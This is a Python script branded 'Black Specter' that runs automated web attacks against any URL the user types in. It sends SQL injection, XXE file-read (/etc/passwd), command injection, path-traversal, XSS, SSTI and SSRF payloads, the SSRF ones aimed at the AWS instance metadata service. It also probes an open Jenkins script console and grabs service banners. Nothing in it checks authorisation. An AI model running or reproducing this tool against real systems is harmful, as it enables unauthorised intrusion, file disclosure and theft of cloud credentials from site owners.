import requests
import socket
import paramiko
import re
import threading
import sys
from urllib.parse import urljoin

ASCII_ART = r'''
███████████  ████                     █████                          
░░███░░░░░███░░███                    ░░███                          
 ░███    ░███ ░███   ██████    ██████  ░███ █████                   
 ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                    
 ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                     
 ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                    
 ███████████  █████░░████████░░██████  ████ █████                   
░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                    
                                                                    
                                                                    
                                                                    
  █████████                               █████                      
 ███░░░░░███                             ░░███                      
░███    ░░░  ████████   ██████   ██████  ███████    ██████  ████████
░░█████████ ░░███░░███ ███░░███ ███░░███░░░███░    ███░░███░░███░░███
 ░░░░░░░░███ ░███ ░███░███████ ░███ ░░░   ░███    ░███████  ░███ ░░░ 
 ███    ░███ ░███ ░███░███░░░  ░███  ███  ░███ ███░███░░░   ░███     
░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████    
 ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░    
             ░███                                                  
             █████                                                
            ░░░░░                                                  
'''

class SQLiAutoExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        urls_to_test = [self.target + param for param in ['?id=1', '?page=1', '?item=1']]
        payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' /*"]
        for url in urls_to_test:
            for payload in payloads:
                full_url = url + payload
                try:
                    r = requests.get(full_url, timeout=8)
                    if r.status_code == 200 and ("sql syntax" in r.text.lower() or "mysql" in r.text.lower() or "you have an error" in r.text.lower() or "warning" in r.text.lower()):
                        return True, full_url
                except Exception:
                    pass
        return False, None

class XXEExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        xml_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>"""
        headers = {'Content-Type': 'application/xml'}
        try:
            r = requests.post(self.target, data=xml_payload, headers=headers, timeout=8)
            if "root:x:" in r.text:
                return True, r.text
        except Exception:
            return False, None
        return False, None

class RCEExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        # Test common RCE payload in params
        payloads = [';id', '&&id', '|id']
        urls_to_test = [self.target + param for param in ['?cmd=', '?command=', '?exec=']]
        for url in urls_to_test:
            for payload in payloads:
                full_url = url + payload
                try:
                    r = requests.get(full_url, timeout=8)
                    if "uid=" in r.text:
                        return True, full_url
                except Exception:
                    pass
        return False, None

class LFIAttack:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        params = ['?file=/etc/passwd', '?page=../../../../../../etc/passwd', '?include=../../../../../../etc/passwd']
        for p in params:
            url = self.target + p
            try:
                r = requests.get(url, timeout=8)
                if "root:x:" in r.text:
                    return True, url
            except Exception:
                pass
        return False, None

class XSSAttack:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        payload = "<script>alert('xss')</script>"
        params = ['?q=', '?search=', '?term=']
        for p in params:
            url = self.target + p + payload
            try:
                r = requests.get(url, timeout=8)
                if payload in r.text:
                    return True, url
            except Exception:
                pass
        return False, None

class SSRFExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        # Try to fetch localhost / internal IP via SSRF vulnerable param
        payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://169.254.169.254/latest/user-data/'
        ]
        params = ['?url=', '?redirect=', '?next=']
        for p in params:
            for payload in payloads:
                url = self.target + p + payload
                try:
                    r = requests.get(url, timeout=8)
                    if r.status_code == 200 and r.text.strip():
                        # naive check for metadata content
                        if 'ami-id' in r.text or 'instance-id' in r.text or 'user-data' in r.text:
                            return True, url
                except Exception:
                    pass
        return False, None

class SSTIExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        payloads = ['{{7*7}}', '${7*7}', '{7*7}']
        params = ['?name=', '?template=', '?input=']
        for p in params:
            for payload in payloads:
                url = self.target + p + payload
                try:
                    r = requests.get(url, timeout=8)
                    if '49' in r.text:
                        return True, url
                except Exception:
                    pass
        return False, None

class HTTPMethodCheck:
    def __init__(self, target):
        self.target = target.rstrip('/')

    def run(self):
        try:
            r = requests.options(self.target, timeout=5)
            allowed = r.headers.get('Allow', '')
            return True, allowed
        except Exception:
            return False, None

class JenkinsExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        if not self.target.startswith('http'):
            self.target = 'http://' + self.target

    def run(self):
        try:
            r = requests.get(self.target + '/script', timeout=8)
            if r.status_code == 200 and 'Jenkins' in r.text:
                # vulnerable if script console open
                return True, self.target + '/script'
            else:
                # Check anonymous access or default creds (not implemented here)
                return False, None
        except Exception:
            return False, None

class DNSExfiltration:
    def __init__(self, domain):
        self.domain = domain

    def run(self):
        # Requires custom DNS server setup to catch exfiltrated data
        # Here just dummy check if domain resolves (real exfiltration needs DNS server)
        try:
            ip = socket.gethostbyname(self.domain)
            return True, ip
        except Exception:
            return False, None

class BannerGrabber:
    def __init__(self, target, port):
        self.target = target
        self.port = port

    def run(self):
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            banner = s.recv(1024).decode(errors='ignore').strip()
            s.close()
            return True, banner
        except Exception:
            return False, None

class SSHScanner:
    def __init__(self, target, port=22):
        self.target = target
        self.port = port

    def run(self):
        try:
            sock = socket.socket()
            sock.settimeout(5)
            sock.connect((self.target, self.port))
            banner = sock.recv(1024).decode('utf-8').strip()
            sock.close()
            return True, banner
        except Exception:
            return False, None

def main():
    print(ASCII_ART)
    target = input("Target URL (http://example.com): ").strip()
    if not target.startswith("http"):
        target = "http://" + target

    modules = [
        ("SQL Injection", SQLiAutoExploit(target)),
        ("XXE", XXEExploit(target)),
        ("RCE", RCEExploit(target)),
        ("LFI", LFIAttack(target)),
        ("XSS", XSSAttack(target)),
        ("SSRF", SSRFExploit(target)),
        ("SSTI", SSTIExploit(target)),
        ("HTTP Methods", HTTPMethodCheck(target)),
        ("Jenkins Console", JenkinsExploit(target)),
        # DNSExfiltration needs domain
    ]

    for name, module in modules:
        print(f"\nRunning {name} test...")
        result, detail = module.run()
        if result:
            print(f"[+] Vulnerability detected in {name}!\nDetail: {detail}")
        else:
            print(f"[-] {name} not vulnerable or not detected.")

    # Banner grabbing example
    print("\nRunning Banner Grabber on port 80...")
    bg = BannerGrabber(target.replace("http://", "").replace("https://", ""), 80)
    result, banner = bg.run()
    if result:
        print(f"[+] Banner grabbed: {banner}")
    else:
        print("[-] Could not grab banner.")

    # SSH Scanner example
    print("\nRunning SSH scanner on port 22...")
    ssh = SSHScanner(target.replace("http://", "").replace("https://", ""), 22)
    result, banner = ssh.run()
    if result:
        print(f"[+] SSH banner: {banner}")
    else:
        print("[-] SSH service not detected.")

if __name__ == "__main__":
    main()

